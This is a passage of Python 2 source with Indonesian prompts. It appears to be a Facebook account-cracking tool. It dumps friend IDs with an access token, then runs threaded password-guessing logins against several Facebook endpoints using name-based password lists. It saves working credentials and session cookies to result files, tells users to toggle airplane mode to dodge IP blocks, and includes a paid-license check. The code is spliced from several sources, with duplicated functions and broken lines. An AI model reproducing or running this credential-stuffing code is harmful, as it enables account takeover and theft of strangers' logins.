                            print '\n%s%s%s akun %s[OK] %stersimpan ke file %s> %shasil/OK-%s-%s-%s.txt'%(U,til,O,H,O,M,H,ha, op, ta);jeda(0.2)
                            print '%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %shasil/CP-%s-%s-%s.txt'%(U,til,O,M,K,M,O,M,K,ha, op, ta);jeda(0.2)
                            print('%s!%s crack berjalan, tekan CTRL+Z untuk stop\n'%(U,O));jeda(0.2)
                            with Lampung(max_workers=30) as njir:
                                for uh in self.id:
                                    try:
                                        ah = uh.split('<=>')[0]
                                        njir.submit(self.mobile, ah, xxnx)
                                    except: pass
                            os.remove(self.apk)
                            exit("\n%s%s finished "%(H,til))
                        else:
                            print '\n%s%s Isi yg benar'%(M,til);jeda(2);xxh()
                    print '\n%s%s%s [ pilih methode crack ]\n'%(U,til,O)
                    print '%s%s%s 01%s methode %sb-api%s (fast crack)'%(U,til,P,O,M,O)
                    print '%s%s%s 02%s methode %smbasic%s (slow crack)'%(U,til,P,O,P,O)
                    print '%s%s%s 03%s methode %smobile%s (very slow crack)'%(U,til,P,O,H,O)
                    xxh(pwek.split(','))
                    break
        elif rom in ('T', 't'):
            print '\n%s%s%s [ pilih methode crack ]\n'%(U,til,O)
            print '%s%s%s 01%s methode %sb-api%s (fast crack)'%(U,til,P,O,M,O)
            print '%s%s%s 02%s methode %smbasic%s (slow crack)'%(U,til,P,O,P,O)
            print '%s%s%s 03%s methode %smobile%s (very slow crack)'%(U,til,P,O,H,O)
            self.sung()
        else:
            print '\n%s%s Isi yg benar'%(M,til);jeda(2);menu()
        return

def api(self, user, xxh):
        global ok,cp,loop
        print('\r%s%s%s [crack] %s/%s [OK-:%s]-[CP-:%s] '%(U,til,O,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in xxh:
            pw = pw.lower()
            try: os.mkdir('hasil')
            except: pass
            try:
            	ua = open('data/ua.txt', 'r').read()
            except (KeyError, IOError):
            	ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"])
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            response = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+user+"&password="+pw+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
            if response.status_code != 200:
            	print ("\r\033[0;91m• IP terblokir. hidupkan mode pesawat 2 detik"),
                sys.stdout.flush()
                loop +=1
                api(self, user, xxh)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print ('\r %s*--> %s ◊ %s ◊ %s   ' % (H,user,pw,response.json()['access_token']))
                wrt = ' *--> %s ◊ %s ◊ %s ' % (user,pw,response.json()['access_token'])
                ok.append(wrt)
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    romz = open('data/token.txt').read()
                    lahir = json.loads(requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).text)["birthday"]
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
                    wrt = ' *--> %s ◊ %s ◊ %s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    lahir = ''
                except:
                    pass
                print '\r %s*--> %s ◊ %s           ' % (K,user,pw)
                wrt = ' *--> %s ◊ %s' % (user,pw)
                cp.append(wrt)
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1
# hapus
def mbasic(self, user, xxh):
        global ok,cp,loop
        print('\r%s%s%s [crack] %s/%s [OK-:%s]-[CP-:%s] '%(U,til,O,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in xxh:
            pw = pw.lower()
            try: os.mkdir('hasil')
            except: pass
            try:
            	ua = open('data/ua.txt', 'r').read()
            except (KeyError, IOError):
            	ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"])
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print ('\r %s*--> %s ◊ %s ◊ %s  ' % (H,user,pw,kuki))
                wrt = (' *--> %s ◊ %s ◊ %s' % (user,pw,kuki))
                ok.append(wrt)
                open('hasil/OK-%s-%s-%s.txt'% (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('data/token.txt').read()
                    lahir = json.loads(requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).text)["birthday"]
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print ('\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year))
                    wrt = (' *--> %s ◊ %s ◊ %s %s %s' % (user,pw,day,month,year))
                    cp.append(wrt)
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    lahir = ''
                except:
                    pass
                print ('\r %s*--> %s ◊ %s           ' % (K,user,pw))
                wrt = (' *--> %s ◊ %s' % (user,pw))
                cp.append(wrt)
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1


# Dump Publik New
def ___new___():
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___ids___ = raw_input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        if ___ids___ in ['',' ']:
            exit("%s[%s!%s]%s Jangan Kosong"%(P,M,P,M))
        oxo = requests.get("https://graph.facebook.com/%s?access_token=%s"%(___ids___,___token___)).json()
        print("%s[%s*%s]%s Nama :%s %s"%(B,P,B,P,H,oxo['name'].lower()))
        ___file___ = oxo['name'].replace(' ','_') + '.json'
        print(" ")
    except (KeyError):
        exit("%s[%s!%s]%s User Tidak Ada"%(P,M,P,M))
    try:
        rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
        file = open(___file___ , 'a')
        for a in rex['friends']['data']:
            if a['id'][:5] in ['10005','10006','10007','10008']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
        file.close()
        ___user___ = open(___file___,'r').readlines()
        print("\r%s                    "%(P))
        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
        print("%s[%s?%s]%s File Tersimpan Di :%s %s"%(H,P,H,P,K,___file___))
        raw_input("\n%s[%sKembali%s]"%(B,H,B));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
def ___metode___():
    print("\n%s[%s1%s]%s Metode mbasic.facebook.com"%(B,P,B,P))
    print("%s[%s2%s]%s Metode free.facebook.com"%(B,P,B,P))
    print("%s[%s3%s]%s Metode mobile.facebook.com"%(B,P,B,P))
    print("%s[%s4%s]%s Metode d.facebook.com %s[%sGK DI SARANKAN%s]"%(M,P,M,P,B,H,B))
    print("%s[%s5%s]%s Metode b-api.facebook.com"%(B,P,B,P))
    print("%s[%s6%s]%s Metode x.facebook.com %s[%sGK DI SARANKAN%s]"%(M,P,M,P,B,H,B))
    ___metode___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
    if ___metode___ in ['1','01']:
        print("\n%s[%s1%s]%s Gunakan Password 123|12345|"%(H,P,H,P))
        print("%s[%s2%s]%s Gunakan Password 123|12345|123456|anjing"%(H,P,H,P))
        print("%s[%s3%s]%s Gunakan Password 123|12345|123456|sayang|Memek"%(H,P,H,P))
        print("%s[%s4%s]%s Gunakan password Dari otak kau"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['4','04']:
            print("\n%s[%s*%s]%s Gunakan Tanda Koma Untuk Password Berbeda. Contoh : Sayang,Cantik"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Harus Lebih Dari 6 Karakter"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%s!%s]%s File Tidak Ada"%(P,M,P,M))
        print("\n%s[%sf%s]%s FIR Ok Tersimpan Di :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sf%s]%s FIR Cp Tersimpan Di :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Gunakan Mode Pesawat 3menit 1kali\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, nama = user.split('<=>')
                ox = nama.split(' ')
                if ___password___ in ['1','01']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345',ox[0]+'112233']
                elif ___password___ in ['2','02']:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345', ox[0]+'123456']
                elif ___password___ in ['3','03']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345', 'Sayang', 'Anjing', 'Bangsat', 'Kontol', 'Bismillah', '123456', 'Cantik']
                elif ___password___ in ['4','04']:
                    pwx = pwd
                else:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345']
                hayuk.submit(mbasic, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sSelesai%s]"%(B,H,P))
    elif ___metode___ in ['2','02']:
        pprint("\n%s[%s1%s]%s Gunakan Password 123|12345|"%(H,P,H,P))
        print("%s[%s2%s]%s Gunakan Password 123|12345|123456|anjing"%(H,P,H,P))
        print("%s[%s3%s]%s Gunakan Password 123|12345|123456|sayang|Memek"%(H,P,H,P))
        print("%s[%s4%s]%s Gunakan password Dari otak kau"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['4','04']:
            print("\n[*] Gunakan Tanda Koma Untuk Password Berbeda. Contoh : Sayang,Cantik"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Harus Lebih Dari 6 Karakter"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%s!%s]%s File Tidak Ada"%(P,M,P,M))
        print("\n%s[%sf%s]%s FIR Ok Tersimpan Di :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sf%s]%s FIR Cp Tersimpan Di :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Gunakan Mode Pesawat 3menit 1kali\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, nama = user.split('<=>')
                ox = nama.split(' ')
                if ___password___ in ['1','01']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345']
                elif ___password___ in ['2','02']:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345', ox[0]+'123456']
                elif ___password___ in ['3','03']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345', 'Sayang', 'Anjing', 'Bangsat', 'Kontol', 'Bismillah', '123456', 'Cantik']
                elif ___password___ in ['4','04']:
                    pwx = pwd
                else:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345']
                hayuk.submit(free, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sSelesai%s]"%(B,H,B))
    elif ___metode___ in ['3','03']:
        print("\n%s[%s1%s]%s Gunakan Password 123|12345|"%(H,P,H,P))
        print("%s[%s2%s]%s Gunakan Password 123|12345|123456|anjing"%(H,P,H,P))
        print("%s[%s3%s]%s Gunakan Password 123|12345|123456|sayang|Memek"%(H,P,H,P))
        print("%s[%s4%s]%s Gunakan password Dari otak kau"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['4','04']:
            print("\n%s[%s*%s]%s Gunakan Tanda Koma Untuk Password Berbeda. Contoh : Sayang,Cantik"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Harus Lebih Dari 6 Karakter"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%s!%s]%s File Tidak Ada"%(P,M,P,M))
        print("\n%s[%sf%s]%s FIR Ok Tersimpan Di :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sf%s]%s FIR Cp Tersimpan Di :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Gunakan Mode Pesawat 3menit 1kali\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, nama = user.split('<=>')
                ox = nama.split(' ')
                if ___password___ in ['1','01']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345']
                elif ___password___ in ['2','02']:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345', ox[0]+'123456']
                elif ___password___ in ['3','03']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345', 'Sayang', 'Anjing', 'Bangsat', 'Kontol', 'Bismillah', '123456', 'Cantik']
                elif ___password___ in ['4','04']:
                    pwx = pwd
                else:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345']
                hayuk.submit(mobile, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sSelesai%s]"%(B,H,B))
    elif ___metode___ in ['4','04']:
        print("\n%s[%s1%s]%s Gunakan Password 123|12345|"%(H,P,H,P))
        print("%s[%s2%s]%s Gunakan Password 123|12345|123456|anjing"%(H,P,H,P))
        print("%s[%s3%s]%s Gunakan Password 123|12345|123456|sayang|Memek"%(H,P,H,P))
        print("%s[%s4%s]%s Gunakan password Dari otak kau"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['4','04']:
            print("\n%s[%s*%s]%s Gunakan Tanda Koma Untuk Password Berbeda. Contoh : Sayang,Cantik"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Harus Lebih Dari 6 Karakter"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%s!%s]%s File Tidak Ada"%(P,M,P,M))
        print("\n%s[%sf%s]%s FIR Ok Tersimpan Di :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sf%s]%s FIR Cp Tersimpan Di :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Gunakan Mode Pesawat 3 menit 1kali\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, nama = user.split('<=>')
                ox = nama.split(' ')
                if ___password___ in ['1','01']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345']
                elif ___password___ in ['2','02']:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345', ox[0]+'123456']
                elif ___password___ in ['3','03']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345', 'Sayang', 'Anjing', 'Bangsat', 'Kontol', 'Bismillah', '123456', 'Cantik']
                elif ___password___ in ['4','04']:
                    pwx = pwd
                else:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345']
                hayuk.submit(crack, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sSelesai%s]"%(B,H,P))
    elif ___metode___ in ['5','05']:
        print("\n%s[%s1%s]%s Gunakan Password 123|12345|"%(H,P,H,P))
        print("%s[%s2%s]%s Gunakan Password 123|12345|123456|anjing"%(H,P,H,P))
        print("%s[%s3%s]%s Gunakan Password 123|12345|123456|sayang|Memek"%(H,P,H,P))
        print("%s[%s4%s]%s Gunakan password Dari otak kau"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['4','04']:
            print("\n[*] Gunakan Tanda Koma Untuk Password Berbeda. Contoh : Sayang,Cantik"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Harus Lebih Dari 6 Karakter"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%s!%s]%s File Tidak Ada"%(P,M,P,M))
        print("\n%s[%sf%s]%s FIR Ok Tersimpan Di :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sf%s]%s FIR OK Tersimpan Di :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Gunakan Mode Pesawat 3menit 1kali\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, nama = user.split('<=>')
                ox = nama.split(' ')
                if ___password___ in ['1','01']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345']
                elif ___password___ in ['2','02']:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345', ox[0]+'123456']
                elif ___password___ in ['3','03']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345', 'Sayang', 'Anjing', 'Bangsat', 'Kontol', 'Bismillah', '123456', 'Cantik']
                elif ___password___ in ['4','04']:
                    pwx = pwd
                else:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345']
                hayuk.submit(api, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sSelesai]%s"%(B,H,B))
    elif ___metode___ in ['6','06']:
        print("\n%s[%s1%s]%s Gunakan Password 123|12345|"%(H,P,H,P))
        print("%s[%s2%s]%s Gunakan Password 123|12345|123456|anjing"%(H,P,H,P))
        print("%s[%s3%s]%s Gunakan Password 123|12345|123456|sayang|Memek"%(H,P,H,P))
        print("%s[%s4%s]%s Gunakan password Dari otak kau"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['4','04']:
            print("\n[*] Gunakan Tanda Koma Untuk Password Berbeda. Contoh : Sayang,Cantik"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Harus Lebih Dari 6 Karakter"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%s!%s]%s File Tidak Ada"%(P,M,P,M))
        print("\n%s[%sf%s]%s FIR Ok Tersimpan Di :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sf%s]%s FIR Cp Tersimpan Di :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Gunakan Mode Pesawat Gunakan 3menit 1kali\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, nama = user.split('<=>')
                ox = nama.split(' ')
                if ___password___ in ['1','01']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345']
                elif ___password___ in ['2','02']:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345', ox[0]+'123456']
                elif ___password___ in ['3','03']:
                    pwx = [nama, ox[0]+'123', ox[0]+'12345', 'Sayang', 'Anjing', 'Bangsat', 'Kontol', 'Bismillah', '123456', 'Cantik']
                elif ___password___ in ['4','04']:
                    pwx = pwd
                else:
                    pwx = [nama, ox[0]+'123', ox[0]+'1234', ox[0]+'12345']
                hayuk.submit(crack2, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sSelesai%s]"%(B,H,B))
    else:
        exit("%s[%s!%s]%s Wrong Input"%(P,M,P,M))
# Crack Mbasic.Facebook.Com
def mbasic(ids, uid, pwx, **kwargs):
    global loop, ua, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            ses = requests.Session()
            ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
            p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
            b = parser(p,"html.parser")
            bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
                    else:continue
                except:pass
            kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
            gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
            if "c_user" in ses.cookies.get_dict().keys():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print("\r\x1b[1;92m[fir-Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print("\r\x1b[1;93m[fir-Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass
# Crack Free.Facebook.Com
def free(ids, uid, pwx, **kwargs):
    global loop, ua, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            ses = requests.Session()
            ses.headers.update({"origin": "https://free.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "free.facebook.com", "referer": "https://free.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
            p = ses.get("https://free.facebook.com/login/?next&ref=dbl&refid=8").text
            b = parser(p,"html.parser")
            bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
                    else:continue
                except:pass
            kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
            gaaa = ses.post("https://free.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ffree.facebook.com%2F&lwv=100&refid=8",data=kwargs)
            if "c_user" in ses.cookies.get_dict().keys():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print("\r\x1b[1;92m[fir-Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print("\r\x1b[1;93m[fir-Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass

# coding=utf-8
import sys,os,requests,time,json,uuid

def Wibu(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

def cek_license():
        try:
                toket = open('license.txt','r').read()
        except IOError:
                os.system('clear')
                print "\n [!] License Invalid"
                os.system('clear')
                os.system('rm -rf license.txt')
                berhasil()
        if os.path.exists('license.txt'):
                berhasil()
        else:
                gagal()

def gagal():
        license = uuid.uuid4().hex[:20]
        idg = open('license.txt', 'w')
        idg.write(license)
        idg.close()
        os.system('clear')
        print (' [+] Your license : '+license)
        Wibu('\n [!] license belum dikonfirmasi')
        Wibu(' [!] Tekan enter untuk mengonfirmasi license')
        raw_input('\n >>> Enter ')
        os.system('am start https://wa.me/218921762445?text=Assalamualaikum,+Bang+jeeck+X+Nano,+Saya+Inggin+Beli+License+License+:%20' + license + ' >/dev/null')
        exit()

def berhasil():
        try:
                cek_license = open('license.txt', 'r').read()
                cek = requests.get('https://pastebin.com/NWjcXQPb').text
                
                if cek_license in cek:
                        os.system('clear')
                        Wibu('\n [✓] License Succeed')
                        time.sleep(3)
                        # Tempel def login jeeck
                else:
                        os.system('clear')
                        license = open('license.txt','r').read()
                        Wibu('\n [!] License belum dikonfirmasi')
                        Wibu(' [!] Tekan enter untuk mengonfirmasi License')
                        raw_input(' >>> Enter ')
                        os.system('am start https://wa.me/218921762446?text=Assalamualaikum,+Bang+jeeck+X+Nano,+Saya+Inggin+Beli+License+License+:%20' + license + ' >/dev/null')
                        exit()
        except requests.exceptions.ConnectionError:
                Wibu('\n [!] Tidak ada koneksi')
                exit()
        except KeyboardInterrupt:
                os.sys.exit()
        except IOError:
                os.system('rm -rf license.txt')
                gagal()

#cek_license()
# Crack Mobile.Facebook.Com
def mobile(ids, uid, pwx, **kwargs):
    global loop, ua, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            ses = requests.Session()
            ses.headers.update({"origin": "https://m.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "m.facebook.com", "referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
            p = ses.get("https://m.facebook.com/login/?next&ref=dbl&refid=8").text
            b = parser(p,"html.parser")
